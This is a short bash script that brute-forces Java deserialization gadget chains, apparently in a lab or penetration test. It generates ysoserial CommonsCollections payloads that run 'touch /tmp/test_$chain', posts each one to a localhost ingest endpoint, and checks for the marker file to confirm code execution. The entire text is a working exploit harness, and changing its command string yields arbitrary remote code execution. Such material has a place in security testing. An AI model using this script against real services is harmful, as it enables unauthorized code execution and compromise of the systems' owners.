# First, list all available gadget chains
java -jar ysoserial.jar

# Try these (most likely to work):
chains=("CommonsCollections5" "CommonsCollections6" "CommonsCollections7" "CommonsCollections2")

for chain in "${chains[@]}"; do
    echo "=== Testing $chain ==="
    java -jar ysoserial.jar $chain "touch /tmp/test_$chain" > payload_$chain.bin
    
    curl -X POST http://localhost:8080/api/v1/ingest \
         --data-binary @payload_$chain.bin \
         -H "Content-Type: application/octet-stream" \
         -s -w "Status: %{http_code}\n"
    
    # Check if file was created
    if [ -f "/tmp/test_$chain" ]; then
        echo "✓ SUCCESS! File created with $chain"
        break
    else
        echo "✗ Failed with $chain"
    fi
    echo ""
done
